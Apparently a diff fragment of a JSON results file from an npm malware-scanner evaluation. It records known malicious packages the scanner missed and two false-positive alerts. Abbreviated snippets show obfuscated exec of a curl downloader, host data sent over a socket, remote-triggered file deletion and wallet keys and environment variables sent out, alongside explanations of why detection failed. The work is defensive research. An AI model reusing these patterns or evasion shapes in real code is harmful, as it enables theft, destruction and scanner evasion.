+      "method": "Read-only TAR/ZIP byte comparison and static text inspection. No package code imports/execution, no dynamic deobfuscation, no payload URL requests, no rule changes. Miss-shape explanations are bounded static inferences.",
+      "records": [
+        {
+          "id": "node-ipc-12.0.1",
+          "file": "package/node-ipc.cjs",
+          "line": 1271,
+          "entrypoints": [
+            {
+              "file": "package/package.json",
+              "line": 6,
+              "fact": "main points at node-ipc.cjs"
+            }
+          ],
+          "staticIndicators": [
+            "obfuscated code appended to the ordinary CommonJS bundle",
+            "literal table contains dns, Resolver, setServers, resolveTxt, gzipSync, readFileSync",
+            "computed property and lookup-function calls obscure networking and environment reads"
+          ],
+          "missShape": "DNS TXT exfiltration and computed property calls are outside the fetch-based secret-flow and fixed HTTP network-call shapes. This is a static shape explanation, not a claim to have decoded or executed the payload.",
+          "evidence": "https://securitylabs.datadoghq.com/articles/node-ipc-npm-malware-analysis/",
+          "originalZipMember": "tmp/tmp_gn0lq5d/node-ipc/package/node-ipc.cjs",
+          "payloadBytes": 117315,
+          "payloadSha256": "96097e0612d9575cb133021017fb1a5c68a03b60f9f3d24ebdc0e628d9034144",
+          "byteIdenticalToOriginalZip": true,
+          "scan": {
+            "status": "complete",
+            "score": 100,
+            "overallLevel": "safe",
+            "highCriticalAlert": false
+          },
+          "contentScan": {
+            "status": "complete",
+            "archiveBytes": 59142,
+            "unpackedBytes": 198822,
+            "filesScanned": 10,
+            "filesSkipped": 13,
+            "integrityVerified": false,
+            "truncated": false
+          },
+          "findingIds": []
+        },
+        {
+          "id": "nodelogic-1.0.0",
+          "file": "package/index.js",
+          "line": 1,
+          "entrypoints": [
+            {
+              "file": "package/package.json",
+              "line": 7,
+              "fact": "postinstall runs node index.js"
+            }
+          ],
+          "staticIndicators": [
+            "destructured exec import uses two lookup results to construct child_process",
+            "literal table contains powershell, Invoke-WebRequest fragments, OutFile and Start-Process fragments",
+            "commands and module names are assembled from lookup results"
+          ],
+          "missShape": "Computed module/command names hide the literal remote-shell and process signatures. The new concealed-capabilities detector is narrower than this script: it expects supported simple module bindings and a process/file-read/network-call combination, while this downloader uses PowerShell plus existence checks.",
+          "evidence": "https://securitylabs.datadoghq.com/articles/mut-8964-an-npm-and-pypi-malicious-campaign-targeting-windows-users/",
+          "originalZipMember": "tmp/tmpqf2d6bb3/nodelogic/package/index.js",
+          "payloadBytes": 2529,
+          "payloadSha256": "9e85e78530f007cf0c9e56038bcfa2eebafb5dc591178cd779e8ac0a7175bcea",
+          "byteIdenticalToOriginalZip": true,
+          "scan": {
+            "status": "complete",
+            "score": 92,
+            "overallLevel": "safe",
+            "highCriticalAlert": false
+          },
+          "contentScan": {
+            "status": "complete",
+            "archiveBytes": 1398,
+            "unpackedBytes": 2844,
+            "filesScanned": 2,
+            "filesSkipped": 0,
+            "integrityVerified": false,
+            "truncated": false
+          },
+          "findingIds": [
+            "install-script"
+          ]
+        },
+        {
+          "id": "rspack-core-1.1.7",
+          "file": "package/dist/util/support.js",
+          "line": 1,
+          "entrypoints": [
+            {
+              "file": "package/package.json",
+              "line": 78,
+              "fact": "postinstall runs node dist/util/support.js"
+            }
+          ],
+          "staticIndicators": [
+            "single-line obfuscated string-table/bundled module payload",
+            "literal table retains /tmp/xmrig, token endpoint, child_process, base64 and geolocation endpoint indicators",
+            "largest raw quoted literals are 204411 and 65649 characters; both exceed the lexer 4096-character literal-value capacity"
+          ],
+          "missShape": "The file is within archive/text budgets, but the constant-table recovery requires literal string entries; oversized literals become opaque and prevent recovery of this table. Computed imports and calls then remain unrecognized. This identifies a supported-grammar gap, not truncated archive bytes.",
+          "evidence": "https://github.com/web-infra-dev/rspack/issues/8767",
+          "originalZipMember": "tmp/tmpz_hivk2s/@rspack-core/package/dist/util/support.js",
+          "payloadBytes": 609441,
+          "payloadSha256": "b91f82dc09bae8c3e72e4cf8f6778a8530417bf5fed3a7e2df49e8b85950eb85",
+          "byteIdenticalToOriginalZip": true,
+          "scan": {
+            "status": "complete",
+            "score": 84,
+            "overallLevel": "safe",
+            "highCriticalAlert": false
+          },
+          "contentScan": {
+            "status": "complete",
+            "archiveBytes": 485392,
+            "unpackedBytes": 2562505,
+            "filesScanned": 235,
+            "filesSkipped": 9,
+            "integrityVerified": false,
+            "truncated": false
+          },
+          "findingIds": [
+            "install-script",
+            "content-process-exec"
+          ]
+        },
+        {
+          "id": "0xengine-xmlrpc-1.3.18",
+          "file": "package/lib/validator.js",
+          "line": 3,
+          "entrypoints": [
+            {
+              "file": "package/lib/xmlrpc.js",
+              "line": 5,
+              "fact": "requires ./validator"
+            },
+            {
+              "file": "package/lib/xmlrpc.js",
+              "line": 43,
+              "fact": "calls validator()"
+            }
+          ],
+          "staticIndicators": [
+            "obfuscated lookup table and arithmetic wrappers",
+            "destructured exec imported through a computed child_proc plus ess module string",
+            "string fragments include xmrig, curl, systemctl, targets and remote repository URL components"
+          ],
+          "missShape": "Runtime-imported payload has no installation hook. Computed module names, anti-analysis scaffolding and fragmented shell script do not fit the supported direct source signatures or narrow constant-table call forms.",
+          "evidence": "https://zero.checkmarx.com/dozens-of-machines-infected-year-long-npm-supply-chain-attack-combines-crypto-mining-and-data-0c674ac4dcbd",
+          "originalZipMember": "tmp/tmp5q5j6cwv/@0xengine-xmlrpc/package/lib/validator.js",
+          "payloadBytes": 12181,
+          "payloadSha256": "0da934b7471a87a326f9afa9ea39c56ce03675947b55f031fb6367946a8236dd",
+          "byteIdenticalToOriginalZip": true,
+          "scan": {
+            "status": "complete",
+            "score": 100,
+            "overallLevel": "safe",
+            "highCriticalAlert": false
+          },
+          "contentScan": {
+            "status": "complete",
+            "archiveBytes": 18050,
+            "unpackedBytes": 56514,
+            "filesScanned": 10,
+            "filesSkipped": 4,
+            "integrityVerified": false,
+            "truncated": false
+          },
+          "findingIds": []
+        }
+      ]
+    },
+    "lastFour": {
+      "recordedAt": "2026-11-12T09:23:16.343164+00:00",
+      "method": "Read-only archive inspection and exact ZIP-to-TAR byte comparison. No archive extraction, sample import/execution, runtime deobfuscation, payload URL contact or rule changes.",
+      "sourceUnchangedIndependentCheck": true,
+      "sourceFilesChecked": 80,
+      "resultsFreezeVerification": {
+        "sourceUnchanged": true,
+        "sourceFilesChecked": 80,
+        "inputHashes": {
+          "scanner-freeze.json": "ca9a36feefd8e8717051bdaee795d4b41bb79a8f1b6c57189a371b4a0fb0c190",
+          "additional-observed.json": "adcaf773a174a8dccc28c3ad86b53ae4be9e20f6a6336b98596ba479b57a659a",
+          "cohort-freeze.json": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "malicious-selection.json": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "benign-selection.json": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "dataset.json": "ce1619e7feb33c8572d18216f062b124d4cdeae6816b4be9785914a37cd47d35",
+          "acquisition.json": "5d056efb79b42827d6fdea42276a2a4cb5b4eb5ec9368c9c15d0fc7e93bdb541",
+          "preparation.json": "9baf0aa6dbfc76a81d9b887dbcef3392437b843cf4d8049ebac08790b7b6b822"
+        },
+        "verifiedAt": "2026-11-12T09:20:25.648Z"
+      },
+      "samples": [
+        {
+          "id": "ethereumvulncontracthandler-1.3.0",
+          "name": "ethereumvulncontracthandler",
+          "version": "1.3.0",
+          "sourceFileCount": 2,
+          "originalZipVsRepackAllBytesEqual": true,
+          "fileSha256": {
+            "package/index.js": "a63ed46adc0fc0db16ac81fdfc188b5f30381cb8ffb8d8ba1c6736c2cd9b7b33",
+            "package/package.json": "a95be9aa42fe5b527430cc3f46502bb883be1a4f943e55cb361feb01d4d171d6"
+          },
+          "scan": {
+            "status": "complete",
+            "score": 100,
+            "level": "safe",
+            "findings": []
+          },
+          "missShape": "Escaped shell downloader command is stored in an object property and reaches exec through computed lookup helpers; module name and dispatch are concealed. Existing remote-shell regex and the supported limited literal-table/data-flow shapes do not recognize the complete chain.",
+          "evidence": [
+            {
+              "file": "package/index.js",
+              "line": 1,
+              "snippet": "{exec}=require(_0x116b48(0x106)); ... kenmU: curl\\x20...HTTPS...kk.cmd...&&...kk.cmd; ... const _0x2a9cd3=_0x336a86[_0x450e9c(0xf7)]; exec(_0x2a9cd3);",
+              "note": "One-line source contains the download/run command, RAM check and execution delay. Snippet abbreviates the archived string; no lookup helper was executed."
+            }
+          ],
+          "qualification": "The exact artifact contains malicious downloader machinery consistent with the cited Quasar campaign. Runtime decoding and successful payload execution were not verified."
+        },
+        {
+          "id": "slf4j-api-js-1.0.0",
+          "name": "slf4j-api-js",
+          "version": "1.0.0",
+          "sourceFileCount": 4,
+          "originalZipVsRepackAllBytesEqual": true,
+          "fileSha256": {
+            "package/LICENSE": "1edfdebaba2c9855fbb653d56075f01b341cca1f5cd922cf0f83c26d22c28ae0",
+            "package/package.json": "266eac8c7937016bbe72f35a4173759693246587b129591bef8702f030fb1162",
+            "package/src/main.js": "b179711ca5ce5f8f64a0c66a2df9e732d69572e39176334af809a988e7b174c6",
+            "package/src/postinstall.js": "ba6f83e35bb81e759cbe0dc8fcc4d5caef0ee2043f1b3d3a8c1f7a742ec1dcf5"
+          },
+          "scan": {
+            "status": "complete",
+            "score": 84,
+            "level": "safe",
+            "findings": [
+              [
+                "install-script",
+                "medium"
+              ],
+              [
+                "content-process-exec",
+                "medium"
+              ]
+            ]
+          },
+          "missShape": "Host/process reconnaissance is serialized and sent through net.Socket.write, outside the HTTP/fetch network patterns. Existing findings are only Medium install and process capabilities.",
+          "evidence": [
+            {
+              "file": "package/src/main.js",
+              "line": 11,
+              "snippet": "hostname, username, homedir, shell, CPU, process and locale details -> _ghhvuuuc(JSON.stringify(p))"
+            },
+            {
+              "file": "package/src/main.js",
+              "line": 13,
+              "snippet": "const b=new _n9acweg2.Socket(); b.connect(...,()=>{b.write(a)})"
+            },
+            {
+              "file": "package/src/postinstall.js",
+              "line": 7,
+              "snippet": "path.resolve(__dirname, \"创建文件夹：slf4j-api-js/src [literal newline] main.js\");",
+              "note": "The quoted path spans a literal newline, copied exactly from the original archive."
+            }
+          ],
+          "qualification": "Main source collects and transmits machine data, but the archived postinstall script has a malformed multiline quoted path and the manifest main points to main.js while source is under src/main.js. Automatic infection viability is not established; this is an archived malicious-content test case with a sample-quality caveat."
+        },
+        {
+          "id": "xlsx-to-json-lh-0.5.2",
+          "name": "xlsx-to-json-lh",
+          "version": "0.5.2",
+          "sourceFileCount": 6,
+          "originalZipVsRepackAllBytesEqual": true,
+          "fileSha256": {
+            "package/.travis.yml": "e50f9af5c07a5a88650a9158ae2d08efa073d286d4234bd4debd44bf0ad07b57",
+            "package/README.md": "037bf60ed01ed019aa729308e2d1c631e21e1341256ccbd0a6ed04f54826f5b8",
+            "package/index.js": "e974ebe5cba288e7ec4a7ad9bb084829e457b6576bfe953b4b40d3595e44d142",
+            "package/libs/index.js": "23c2e546a782f620370089b72cb00b1810ca5ba59a9d2ba0d2cf5592df5229c9",
+            "package/libs/support/index.js": "da65831e88933c21e81447dbea277cacfcac19e4594b5836d613a1e1dc965bc2",
+            "package/package.json": "b835c10e99ec0db6e8d382a6a4b687cdac683202995149e1f92ead0fdc669a95"
+          },
+          "scan": {
+            "status": "complete",
+            "score": 82,
+            "level": "safe",
+            "findings": [
+              [
+                "suspicious-build-metadata",
+                "low"
+              ],
+              [
+                "suspicious-build-metadata",
+                "low"
+              ],
+              [
+                "suspicious-build-metadata",
+                "low"
+              ],
+              [
+                "suspicious-build-metadata",
+                "low"
+              ],
+              [
+                "suspicious-build-metadata",
+                "low"
+              ],
+              [
+                "suspicious-build-metadata",
+                "low"
+              ]
+            ]
+          },
+          "missShape": "socket.io message callback triggers recursive filesystem deletion. No existing rule covers remote-command-driven destructive filesystem behavior; neither child-process nor supported fetch exfiltration is required.",
+          "evidence": [
+            {
+              "file": "package/libs/index.js",
+              "line": 4,
+              "snippet": "var support = require('./support');"
+            },
+            {
+              "file": "package/libs/support/index.js",
+              "line": 10,
+              "snippet": "socket.on('message', function(data) { ... command discriminator ..."
+            },
+            {
+              "file": "package/libs/support/index.js",
+              "line": 27,
+              "snippet": "fs.unlinkSync(dir + x);"
+            },
+            {
+              "file": "package/libs/support/index.js",
+              "line": 33,
+              "snippet": "fs.rmdirSync(dir);"
+            },
+            {
+              "file": "package/libs/support/index.js",
+              "line": 38,
+              "snippet": "rmDir(pathName.split(lastPart2)[0]+\"/\"+lastPart2);"
+            }
+          ],
+          "qualification": "Destructive source and import path are present. package.json declares csv/xlsx but not socket.io-client, so runtime availability depends on environment and was not tested."
+        },
+        {
+          "id": "crypto-encrypt-ts-5.4.5",
+          "name": "crypto-encrypt-ts",
+          "version": "5.4.5",
+          "sourceFileCount": 4,
+          "originalZipVsRepackAllBytesEqual": true,
+          "fileSha256": {
+            "package/README.md": "3141d8b864d6b0dac8d45b883fa3936fef55c7f6b6f79e73b89bef7feac33f6c",
+            "package/package.json": "61771318890e493dabe5329578cc9d27a29f7602be41fed9eca9566eac20f284",
+            "package/scripts/setup.js": "3d2ba5c615dbf75b203e5726c689079b2a9860868a0a38d3f5e1fdbad7034d32",
+            "package/scripts/start.js": "add8a62df9a2ce1f69dfb8e65494e983fe49a6371fe175c1d17f1f8c7d356c46"
+          },
+          "scan": {
+            "status": "complete",
+            "score": 84,
+            "level": "safe",
+            "findings": [
+              [
+                "install-script",
+                "medium"
+              ],
+              [
+                "content-process-exec",
+                "medium"
+              ]
+            ]
+          },
+          "missShape": "Queries MongoDB wallet records and sends wallet.private plus process.env through @logtail/node logging SDK. The secret-flow rule expects specific private-key names and fetch sinks, while the generic sensitive-environment rule does not recognize this SDK/API pattern.",
+          "evidence": [
+            {
+              "file": "package/scripts/start.js",
+              "line": 4,
+              "snippet": "const { Logtail } = require('@logtail/node');"
+            },
+            {
+              "file": "package/scripts/start.js",
+              "line": 82,
+              "snippet": "mongoose.connection.collection('wallets').find({ balance: { $gt: 1000 } }).toArray()"
+            },
+            {
+              "file": "package/scripts/start.js",
+              "line": 87,
+              "snippet": "logtail.info(..., { wallets: wallets.map(wallet => ({ ... private: wallet.private ... })) })"
+            },
+            {
+              "file": "package/scripts/start.js",
+              "line": 117,
+              "snippet": "const sanitizedEnv = { ...process.env };"
+            },
+            {
+              "file": "package/scripts/start.js",
+              "line": 119,
+              "snippet": "logtail.info('Environment variables', { environment: sanitizedEnv })"
+            },
+            {
+              "file": "package/scripts/start.js",
+              "line": 124,
+              "snippet": "cron.schedule('*/1 * * * *', async () => { ... })"
+            },
+            {
+              "file": "package/scripts/setup.js",
+              "line": 5,
+              "snippet": "exec('npm install -g pm2 && pm2 start ' + cronJobPath + ' --name process-monitor', ...)"
+            }
+          ],
+          "qualification": "Wallet/environment collection and remote logging are directly visible; source matches published research. Credentials/endpoints were not contacted, and no persistence or package code was run."
+        }
+      ]
+    },
+    "controls": {
+      "scope": "Read-only triage of the two alerted controls from the frozen 20-version run; no scanner changes, source execution or new sample selection.",
+      "controls": [
+        {
+          "name": "@electron/get",
+          "version": "3.1.0",
+          "classification": "false-positive-malicious-package-alert",
+          "metadata": {
+            "score": 85,
+            "level": "suspicious"
+          },
+          "deep": {
+            "score": 77,
+            "level": "suspicious",
+            "status": "complete"
+          },
+          "falsePositiveRule": "typosquatting",
+          "severity": "high",
+          "ruleEvidence": "The rule removes the @electron scope, compares get against popular-package names, and reports edit distance 2 to jest. This is the official Electron artifact downloader, not a jest lookalike package.",
+          "officialSource": "https://github.com/electron/get",
+          "packageEvidence": [
+            {
+              "file": "package/package.json",
+              "field": "name",
+              "value": "@electron/get"
+            },
+            {
+              "file": "package/package.json",
+              "field": "repository",
+              "value": "https://github.com/electron/get"
+            },
+            {
+              "file": "package/README.md",
+              "line": 1,
+              "snippet": "# @electron/get"
+            },
+            {
+              "file": "package/README.md",
+              "line": 3,
+              "snippet": "> Download Electron release artifacts"
+            }
+          ],
+          "additionalFinding": {
+            "ruleId": "content-process-exec",
+            "severity": "medium",
+            "classification": "accurate-capability-not-malware-evidence",
+            "file": "package/dist/cjs/utils.js",
+            "reportedLine": 4,
+            "reportedSnippet": "const childProcess = require(\"child_process\");",
+            "useLine": 55,
+            "useSnippet": ".execSync('uname -m')",
+            "explanation": "The package genuinely invokes a subprocess to identify the host architecture. That Medium capability finding accounts for the additional eight-point deduction in deep mode; the High package-name finding is the false positive."
+          }
+        },
+        {
+          "name": "dotenv",
+          "version": "16.5.0",
+          "classification": "false-positive-secret-exposure",
+          "metadata": {
+            "score": 75,
+            "level": "dangerous"
+          },
+          "deep": {
+            "score": 75,
+            "level": "dangerous",
+            "status": "complete"
+          },
+          "falsePositiveRule": "secret-exposure",
+          "severity": "critical",
+          "ruleEvidence": "SSH_KEY_PATTERN only checks for a private-key BEGIN header. The README's multiline-variable documentation contains explicitly abbreviated illustrative key blocks with ellipses, not a complete credential. The rule calls this an exposed SSH key and the Critical severity forces dangerous.",
+          "officialSource": "https://github.com/motdotla/dotenv",
+          "packageEvidence": [
+            {
+              "file": "package/README.md",
+              "line": 104,
+              "snippet": "### Multiline values"
+            },
+            {
+              "file": "package/README.md",
+              "line": 106,
+              "snippet": "If you need multiline variables, for example private keys, those are now supported"
+            },
+            {
+              "file": "package/README.md",
+              "line": 109,
+              "snippet": "PRIVATE_KEY=\"[private-key header; illustrative value omitted]\""
+            },
+            {
+              "file": "package/README.md",
+              "line": 110,
+              "snippet": "..."
+            },
+            {
+              "file": "package/README.md",
+              "line": 119,
+              "snippet": "PRIVATE_KEY=\"[private-key header]\\n...\\n[end marker]\" (sanitized)"
+            }
+          ],
+          "scannerEvidence": [
+            {
+              "file": "packages/core/src/scanner/static-rules.ts",
+              "line": 198,
+              "explanation": "The regex matches only the BEGIN marker, without requiring a complete key body or checking documentation-placeholder context."
+            },
+            {
+              "file": "packages/core/src/scanner/static-rules.ts",
+              "line": 475,
+              "explanation": "Any marker match emits the Critical secret-exposure finding."
+            }
+          ],
+          "redaction": "No full private-key contents reproduced; examples are placeholders and snippets are sanitized further."
+        }
+      ]
+    }
+  },
+  "note": "Full raw results and archives remain local under .npm-safe/fresh-evaluation-20261112/. Code snippets omitted from portable scan rows; post-scan evidence is bounded and sanitized. No original npm SRI claim for malicious source repacks. Metadata mode uses archived manifest/README, not registry reputation."
+}
